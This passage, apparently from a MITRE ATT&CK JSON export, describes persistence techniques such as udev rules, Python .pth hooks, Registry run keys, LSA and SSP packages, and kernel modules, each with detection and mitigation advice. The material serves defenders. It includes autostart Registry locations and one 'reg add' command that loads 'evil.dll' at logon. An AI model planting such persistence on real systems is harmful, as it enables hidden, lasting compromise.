href=\"https://cpb-us-e1.wpmucdn.com/sites.psu.edu/dist/4/24696/files/2019/07/psumac2019-345-Installer-Package-Scripting-Making-your-deployments-easier-one-at-a-time.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Installer Package Scripting Rich Trouton)</a>\n\nUsing legitimate applications, adversaries have distributed applications with modified installer scripts to execute malicious content. When a user installs the application, they may be required to grant administrative permissions to allow the installation. At the end of the installation process of the legitimate application, content such as macOS <code>postinstall</code> scripts can be executed with the inherited elevated permissions. Adversaries can use these scripts to execute a malicious executable or install other malicious components (such as a Launch Daemon) with the elevated permissions. <a href=\"https://redcanary.com/blog/mac-application-bundles/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Application Bundle Manipulation Brandon Dalton)</a> <a href=\"https://objective-see.com/blog/blog_0x59.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: wardle evilquest parti)</a> <a href=\"https://securelist.com/operation-applejeus/87553/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Windows AppleJeus GReAT)</a> <a href=\"https://www.debian.org/doc/debian-policy/ch-maintainerscripts.html#s-mscriptsinstact\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Debian Manual Maintainer Scripts)</a>\n\nDepending on the distribution, Linux versions of package installer scripts are sometimes called maintainer scripts or post installation scripts. These scripts can include <code>preinst</code>, <code>postinst</code>, <code>prerm</code>, <code>postrm</code> scripts and run as root when executed.\n\nFor Windows, the Microsoft Installer services uses <code>.msi</code> files to manage the installing, updating, and uninstalling of applications. These installation routines may also include instructions to perform additional actions that may be abused by adversaries. <a href=\"https://learn.microsoft.com/windows/win32/msi/installation-procedure-tables-group\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Installation Procedures)</a>","detection":"","platforms":["Linux","macOS","Windows"],"dataSources":["Process: Process Creation","Command: Command Execution","File: File Creation"],"mitigations":[]},{"id":"T1546.017","name":"Udev Rules","description":"Adversaries may maintain persistence through executing malicious content triggered using udev rules. Udev is the Linux kernel device manager that dynamically manages device nodes, handles access to pseudo-device files in the <code>/dev</code> directory, and responds to hardware events, such as when external devices like hard drives or keyboards are plugged in or removed. Udev uses rule files with <code>match keys</code> to specify the conditions a hardware event must meet and <code>action keys</code> to define the actions that should follow. Root permissions are required to create, modify, or delete rule files located in <code>/etc/udev/rules.d/</code>, <code>/run/udev/rules.d/</code>, <code>/usr/lib/udev/rules.d/</code>, <code>/usr/local/lib/udev/rules.d/</code>, and <code>/lib/udev/rules.d/</code>. Rule priority is determined by both directory and by the digit prefix in the rule filename. <a href=\"https://ch4ik0.github.io/en/posts/leveraging-Linux-udev-for-persistence/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Ignacio Udev research 2024)</a> <a href=\"https://www.elastic.co/security-labs/sequel-on-persistence-mechanisms\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic Linux Persistence 2024)</a>\n\nAdversaries may abuse the udev subsystem by adding or modifying rules in udev rule files to execute malicious content. For example, an adversary may configure a rule to execute their binary each time the pseudo-device file, such as <code>/dev/random</code>, is accessed by an application. Although udev is limited to running short tasks and is restricted by systemd-udevd's sandbox (blocking network and filesystem access), attackers may use scripting commands under the action key <code>RUN+=</code> to detach and run the malicious content’s process in the background to bypass these controls. <a href=\"https://www.aon.com/en/insights/cyber-labs/unveiling-sedexp\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Reichert aon sedexp 2024)</a>","detection":"Monitor file creation and modification of Udev rule files in <code>/etc/udev/rules.d/</code>, <code>/lib/udev/rules.d/</code>, and /usr/lib/udev/rules.d/, specifically the <code>RUN</code> action key commands. <a href=\"https://ch4ik0.github.io/en/posts/leveraging-Linux-udev-for-persistence/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Ignacio Udev research 2024)</a>","platforms":["Linux"],"dataSources":["Process: Process Creation","File: File Modification"],"mitigations":[]},{"id":"T1546.018","name":"Python Startup Hooks","description":"Adversaries may achieve persistence by leveraging Python’s startup mechanisms, including path configuration (<code>.pth</code>) files and the <code>sitecustomize.py</code> or <code>usercustomize.py</code> modules. These files are automatically processed during the initialization of the Python interpreter, allowing for the execution of arbitrary code whenever Python is invoked. <a href=\"https://www.volexity.com/blog/2024/04/12/zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Volexity GlobalProtect CVE 2024)</a>\n\nPath configuration files are designed to extend Python’s module search paths through the use of import statements. If a <code>.pth</code> file is placed in Python's <code>site-packages</code> or <code>dist-packages</code> directories, any lines beginning with <code>import</code> will be executed automatically on Python invocation. <a href=\"https://dfir.ch/posts/publish_python_pth_extension/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: DFIR Python Persistence 2025)</a> Similarly, if <code>sitecustomize.py</code> or <code>usercustomize.py</code> is present in the Python path, these files will be imported during interpreter startup, and any code they contain will be executed. <a href=\"https://docs.python.org/3/library/site.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Python Site Configuration Hook)</a>\n\nAdversaries may abuse these mechanisms to establish persistence on systems where Python is widely used (e.g., for automation or scripting in production environments).","detection":"","platforms":["Linux","macOS","Windows"],"dataSources":[],"mitigations":[]}]},{"id":"T1547","name":"Boot or Logon Autostart Execution","description":"Adversaries may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems. Operating systems may have mechanisms for automatically running a program on system boot or account logon. <a href=\"https://learn.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Run Key)</a> <a href=\"https://msdn.microsoft.com/library/windows/desktop/aa374733.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MSDN Authentication Packages)</a> <a href=\"https://msdn.microsoft.com/library/windows/desktop/ms725475.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft TimeProvider)</a> <a href=\"https://blog.cylance.com/windows-registry-persistence-part-2-the-run-keys-and-search-order\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cylance Reg Persistence Sept 2013)</a> <a href=\"https://www.tldp.org/LDP/lkmpg/2.4/lkmpg.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Linux Kernel Programming)</a> These mechanisms may include automatically executing programs that are placed in specially designated directories or are referenced by repositories that store configuration information, such as the Windows Registry. An adversary may achieve the same goal by modifying or extending features of the kernel.\n\nSince some boot or logon autostart programs run with higher privileges, an adversary may leverage these to elevate privileges.","detection":"Monitor for additions or modifications of mechanisms that could be used to trigger autostart execution, such as relevant additions to the Registry. Look for changes that are not correlated with known updates, patches, or other planned administrative activity. Tools such as Sysinternals Autoruns may also be used to detect system autostart configuration changes that could be attempts at persistence. <a href=\"https://technet.microsoft.com/en-us/sysinternals/bb963902\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Autoruns)</a>  Changes to some autostart configuration settings may happen under normal conditions when legitimate software is installed. \n\nSuspicious program execution as autostart programs may show up as outlier processes that have not been seen before when compared against historical data.To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.\n\nMonitor DLL loads by processes, specifically looking for DLLs that are not recognized or not normally loaded into a process. Look for abnormal process behavior that may be due to a process loading a malicious DLL.\n\nMonitor for abnormal usage of utilities and command-line parameters involved in kernel modification or driver installation.","platforms":["Linux","macOS","Windows","Network Devices"],"dataSources":["Process: OS API Execution","Module: Module Load","Command: Command Execution","File: File Creation","Windows Registry: Windows Registry Key Creation","Windows Registry: Windows Registry Key Modification","File: File Modification","Kernel: Kernel Module Load","Process: Process Creation","Driver: Driver Load"],"mitigations":[],"subTechniques":[{"id":"T1547.001","name":"Registry Run Keys / Startup Folder","description":"Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. <a href=\"https://learn.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Run Key)</a> These programs will be executed under the context of the user and will have the account's associated permissions level.\n\nThe following run keys are created by default on Windows systems:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n\nRun keys may exist under multiple hives. <a href=\"https://docs.microsoft.com/en-us/windows/win32/sysinfo/32-bit-and-64-bit-application-data-in-the-registry\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Wow6432Node 2018)</a> <a href=\"https://blog.malwarebytes.com/cybercrime/2013/10/hiding-in-plain-sight/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Malwarebytes Wow6432Node 2016)</a> The <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. <a href=\"https://learn.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Run Key)</a> For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: <code>reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil[.]dll\"</code> <a href=\"https://oddvar.moe/2018/03/21/persistence-using-runonceex-hidden-from-autoruns-exe/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Oddvar Moe RunOnceEx Mar 2018)</a>\n\nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is <code>C:\\Users\\\\[Username]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup</code>. The startup folder path for all users is <code>C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp</code>.\n\nThe following Registry keys can be used to set startup folder items for persistence:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n\nThe following Registry keys can control automatic startup of services during boot:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n\nPrograms listed in the load value of the registry key <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> run automatically for the currently logged-on user.\n\nBy default, the multistring <code>BootExecute</code> value of the registry key <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager</code> is set to <code>autocheck autochk *</code>. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\n\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use Masquerading to make the Registry entries look as if they are associated with legitimate programs.","detection":"Monitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations and startup folders. <a href=\"https://technet.microsoft.com/en-us/sysinternals/bb963902\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Autoruns)</a> Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.\n\nChanges to these locations typically happen under normal conditions when legitimate software is installed. To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.","platforms":["Windows"],"dataSources":["Command: Command Execution","File: File Modification","Process: Process Creation","Windows Registry: Windows Registry Key Creation","Windows Registry: Windows Registry Key Modification"],"mitigations":[]},{"id":"T1547.002","name":"Authentication Package","description":"Adversaries may abuse authentication packages to execute DLLs when the system boots. Windows authentication package DLLs are loaded by the Local Security Authority (LSA) process at system start. They provide support for multiple logon processes and multiple security protocols to the operating system. <a href=\"https://msdn.microsoft.com/library/windows/desktop/aa374733.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MSDN Authentication Packages)</a>\n\nAdversaries can use the autostart mechanism provided by LSA authentication packages for persistence by placing a reference to a binary in the Windows Registry location <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\</code> with the key value of <code>\"Authentication Packages\"=&amp;lt;target binary&amp;gt;</code>. The binary will then be executed by the system when the authentication packages are loaded.","detection":"Monitor the Registry for changes to the LSA Registry keys. Monitor the LSA process for DLL loads. Windows 8.1 and Windows Server 2012 R2 may generate events when unsigned DLLs try to load into the LSA by setting the Registry key <code>HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\LSASS.exe</code> with AuditLevel = 8. <a href=\"http://docplayer.net/20839173-Analysis-of-malicious-security-support-provider-dlls.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Graeber 2014)</a> <a href=\"https://technet.microsoft.com/en-us/library/dn408187.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Configure LSA)</a>","platforms":["Windows"],"dataSources":["Command: Command Execution","Windows Registry: Windows Registry Key Modification","Module: Module Load"],"mitigations":[{"id":"M1025","name":"Privileged Process Integrity","description":"Windows 8.1, Windows Server 2012 R2, and later versions, may make LSA run as a Protected Process Light (PPL) by setting the Registry key <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\RunAsPPL</code>, which requires all DLLs loaded by LSA to be signed by Microsoft. <a href=\"http://docplayer.net/20839173-Analysis-of-malicious-security-support-provider-dlls.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Graeber 2014)</a> <a href=\"https://technet.microsoft.com/en-us/library/dn408187.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Configure LSA)</a>"}]},{"id":"T1547.003","name":"Time Providers","description":"Adversaries may abuse time providers to execute DLLs when the system boots. The Windows Time service (W32Time) enables time synchronization across and within domains. <a href=\"https://docs.microsoft.com/windows-server/networking/windows-time-service/windows-time-service-top\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft W32Time Feb 2018)</a> W32Time time providers are responsible for retrieving time stamps from hardware/network resources and outputting these values to other network clients. <a href=\"https://msdn.microsoft.com/library/windows/desktop/ms725475.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft TimeProvider)</a>\n\nTime providers are implemented as dynamic-link libraries (DLLs) that are registered in the subkeys of <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\</code>. <a href=\"https://msdn.microsoft.com/library/windows/desktop/ms725475.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft TimeProvider)</a> The time provider manager, directed by the service control manager, loads and starts time providers listed and enabled under this key at system startup and/or whenever parameters are changed. <a href=\"https://msdn.microsoft.com/library/windows/desktop/ms725475.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft TimeProvider)</a>\n\nAdversaries may abuse this architecture to establish persistence, specifically by creating a new arbitrarily named subkey  pointing to a malicious DLL in the <code>DllName</code> value. Administrator privileges are required for time provider registration, though execution will run in context of the Local Service account. <a href=\"https://github.com/scottlundgren/w32time\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Github W32Time Oct 2017)</a>","detection":"Baseline values and monitor/analyze activity related to modifying W32Time information in the Registry, including application programming interface (API) calls such as <code>RegCreateKeyEx</code> and <code>RegSetValueEx</code> as well as execution of the W32tm.exe utility. <a href=\"https://docs.microsoft.com/windows-server/networking/windows-time-service/windows-time-service-tools-and-settings\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft W32Time May 2017)</a> There is no restriction on the number of custom time providers registrations, though each may require a DLL payload written to disk. <a href=\"https://github.com/scottlundgren/w32time\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Github W32Time Oct 2017)</a>\n\nThe Sysinternals Autoruns tool may also be used to analyze auto-starting locations, including DLLs listed as time providers. <a href=\"https://technet.microsoft.com/en-us/sysinternals/bb963902\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Autoruns)</a>","platforms":["Windows"],"dataSources":["Process: Process Creation","Command: Command Execution","Windows Registry: Windows Registry Key Modification","Module: Module Load"],"mitigations":[{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Consider using Group Policy to configure and block additions/modifications to W32Time DLLs. <a href=\"https://docs.microsoft.com/windows-server/networking/windows-time-service/windows-time-service-tools-and-settings\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft W32Time May 2017)</a>"},{"id":"M1024","name":"Restrict Registry Permissions","description":"Consider using Group Policy to configure and block modifications to W32Time parameters in the Registry. <a href=\"https://docs.microsoft.com/windows-server/networking/windows-time-service/windows-time-service-tools-and-settings\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft W32Time May 2017)</a>"}]},{"id":"T1547.004","name":"Winlogon Helper DLL","description":"Adversaries may abuse features of Winlogon to execute DLLs and/or executables when a user logs in. Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in <code>HKLM\\Software[\\\\Wow6432Node\\\\]\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\</code> and <code>HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\</code> are used to manage additional helper programs and functionalities that support Winlogon. <a href=\"https://blog.cylance.com/windows-registry-persistence-part-2-the-run-keys-and-search-order\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cylance Reg Persistence Sept 2013)</a> \n\nMalicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and/or executables. Specifically, the following subkeys have been known to be possibly vulnerable to abuse: <a href=\"https://blog.cylance.com/windows-registry-persistence-part-2-the-run-keys-and-search-order\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cylance Reg Persistence Sept 2013)</a>\n\n* Winlogon\\Notify - points to notification package DLLs that handle Winlogon events\n* Winlogon\\Userinit - points to userinit.exe, the user initialization program executed when a user logs on\n* Winlogon\\Shell - points to explorer.exe, the system shell executed when a user logs on\n\nAdversaries may take advantage of these features to repeatedly execute malicious code and establish persistence.","detection":"Monitor for changes to Registry entries associated with Winlogon that do not correlate with known software, patch cycles, etc. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current Winlogon helper values. <a href=\"https://technet.microsoft.com/en-us/sysinternals/bb963902\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Autoruns)</a>  New DLLs written to System32 that do not correlate with known good software or patching may also be suspicious.\n\nLook for abnormal process behavior that may be due to a process loading a malicious DLL. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.","platforms":["Windows"],"dataSources":["Command: Command Execution","Module: Module Load","Process: Process Creation","Windows Registry: Windows Registry Key Modification"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Limit the privileges of user accounts so that only authorized administrators can perform Winlogon helper changes."},{"id":"M1038","name":"Execution Prevention","description":"Identify and block potentially malicious software that may be executed through the Winlogon helper process by using application control <a href=\"http://www.sans.org/reading-room/whitepapers/application/application-whitelisting-panacea-propaganda-33599\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Beechey 2010)</a> tools like AppLocker <a href=\"https://blogs.jpcert.or.jp/en/2016/01/windows-commands-abused-by-attackers.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Windows Commands JPCERT)</a> <a href=\"https://apps.nsa.gov/iaarchive/library/ia-guidance/tech-briefs/application-whitelisting-using-microsoft-applocker.cfm\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NSA MS AppLocker)</a> that are capable of auditing and/or blocking unknown DLLs."}]},{"id":"T1547.005","name":"Security Support Provider","description":"Adversaries may abuse security support providers (SSPs) to execute DLLs when the system boots. Windows SSP DLLs are loaded into the Local Security Authority (LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs.\n\nThe SSP configuration is stored in two Registry keys: <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages</code> and <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called. <a href=\"http://docplayer.net/20839173-Analysis-of-malicious-security-support-provider-dlls.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Graeber 2014)</a>","detection":"Monitor the Registry for changes to the SSP Registry keys. Monitor the LSA process for DLL loads. Windows 8.1 and Windows Server 2012 R2 may generate events when unsigned SSP DLLs try to load into the LSA by setting the Registry key <code>HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\LSASS.exe</code> with AuditLevel = 8. <a href=\"http://docplayer.net/20839173-Analysis-of-malicious-security-support-provider-dlls.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Graeber 2014)</a> <a href=\"https://technet.microsoft.com/en-us/library/dn408187.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Configure LSA)</a>","platforms":["Windows"],"dataSources":["Command: Command Execution","Module: Module Load","Windows Registry: Windows Registry Key Modification"],"mitigations":[{"id":"M1025","name":"Privileged Process Integrity","description":"Windows 8.1, Windows Server 2012 R2, and later versions may make LSA run as a Protected Process Light (PPL) by setting the Registry key <code>HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa\\\\RunAsPPL</code>, which requires all SSP DLLs to be signed by Microsoft. <a href=\"http://docplayer.net/20839173-Analysis-of-malicious-security-support-provider-dlls.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Graeber 2014)</a> <a href=\"https://technet.microsoft.com/en-us/library/dn408187.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Configure LSA)</a>"}]},{"id":"T1547.006","name":"Kernel Modules and Extensions","description":"Adversaries may modify the kernel to automatically execute programs on system boot. Loadable Kernel Modules (LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. <a href=\"https://www.tldp.org/LDP/lkmpg/2.4/lkmpg.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Linux Kernel Programming)</a> \n\nWhen used maliciously, LKMs can be a type of kernel-mode Rootkit that run with the highest operating system privilege (Ring 0). <a href=\"http://www.tldp.org/LDP/lkmpg/2.4/html/x437.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Linux Kernel Module Programming Guide)</a> Common features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors, and enabling root access to non-privileged users. <a href=\"http://www.megasecurity.org/papers/Rootkits.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: iDefense Rootkit Overview)</a>\n\nKernel extensions, also called kext, are used in macOS to load functionality onto a system similar to LKMs for Linux. Since the kernel is responsible for enforcing security and the kernel extensions run as apart of the kernel, kexts are not governed by macOS security policies. Kexts are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Kexts need to be signed with a developer ID that is granted privileges by Apple allowing it to sign Kernel extensions. Developers without these privileges may still sign kexts but they will not load unless SIP is disabled. If SIP is enabled, the kext signature is verified before being added to the AuxKC. <a href=\"https://support.apple.com/guide/deployment/system-and-kernel-extensions-in-macos-depa5fb8376f/web\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: System and kernel extensions in macOS)</a>\n\nSince macOS Catalina 10.15, kernel extensions have been deprecated in favor of System Extensions. However, kexts are still allowed as \"Legacy System Extensions\" since there is no System Extension for Kernel Programming Interfaces. <a href=\"https://developer.apple.com/support/kernel-extensions/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Apple Kernel Extension Deprecation)</a>\n\nAdversaries can use LKMs and kexts to conduct Persistence and/or Privilege Escalation on a system. Examples have been found in the wild, and there are some relevant open source projects as well. <a href=\"https://volatility-labs.blogspot.com/2012/10/phalanx-2-revealed-using-volatility-to.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Volatility Phalanx2)</a> <a href=\"https://www.crowdstrike.com/blog/http-iframe-injecting-linux-rootkit/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CrowdStrike Linux Rootkit)</a> <a href=\"https://github.com/f0rb1dd3n/Reptile\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GitHub Reptile)</a> <a href=\"https://github.com/m0nad/Diamorphine\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GitHub Diamorphine)</a> <a href=\"https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: RSAC 2015 San Francisco Patrick Wardle)</a> <a href=\"https://www.synack.com/2017/09/08/high-sierras-secure-kernel-extension-loading-is-broken/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Synack Secure Kernel Extension Broken)</a> <a href=\"https://securelist.com/the-ventir-trojan-assemble-your-macos-spy/67267/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Securelist Ventir)</a> <a href=\"https://blog.trendmicro.com/trendlabs-security-intelligence/skidmap-linux-malware-uses-rootkit-capabilities-to-hide-cryptocurrency-mining-payload/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Trend Micro Skidmap)</a>","detection":"Loading, unloading, and manipulating modules on Linux systems can be detected by monitoring for the following commands: <code>modprobe</code>, <code>insmod</code>, <code>lsmod</code>, <code>rmmod</code>, or <code>modinfo</code> <a href=\"http://tldp.org/HOWTO/Module-HOWTO/x197.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Linux Loadable Kernel Module Insert and Remove LKMs)</a> LKMs are typically loaded into <code>/lib/modules</code> and have had the extension .ko (\"kernel object\") since version 2.6 of the Linux kernel. <a href=\"https://en.wikipedia.org/wiki/Loadable_kernel_module#Linux\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wikipedia Loadable Kernel Module)</a>\n\nAdversaries may run commands on the target system before loading a malicious module in order to ensure that it is properly compiled. <a href=\"http://www.megasecurity.org/papers/Rootkits.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: iDefense Rootkit Overview)</a> Adversaries may also execute commands to identify the exact version of the running Linux kernel and/or download multiple versions of the same .ko (kernel object) files to use the one appropriate for the running system. <a href=\"https://blog.trendmicro.com/trendlabs-security-intelligence/skidmap-linux-malware-uses-rootkit-capabilities-to-hide-cryptocurrency-mining-payload/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Trend Micro Skidmap)</a> Many LKMs require Linux headers (specific to the target kernel) in order to compile properly. These are typically obtained through the operating systems package manager and installed like a normal package. On Ubuntu and Debian based systems this can be accomplished by running: <code>apt-get install linux-headers-$(uname -r)</code> On RHEL and CentOS based systems this can be accomplished by running: <code>yum install kernel-devel-$(uname -r)</code>\n\nOn macOS, monitor for execution of <code>kextload</code> commands and user installed kernel extensions performing abnormal and/or potentially malicious activity (such as creating network connections). Monitor for new rows added in the <code>kext_policy</code> table. KextPolicy stores a list of user approved (non Apple) kernel extensions and a partial history of loaded kernel modules in a SQLite database, <code>/var/db/SystemPolicyConfiguration/KextPolicy</code>. <a href=\"https://pikeralpha.wordpress.com/2017/08/29/user-approved-kernel-extension-loading/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: User Approved Kernel Extension Pike’s)</a> 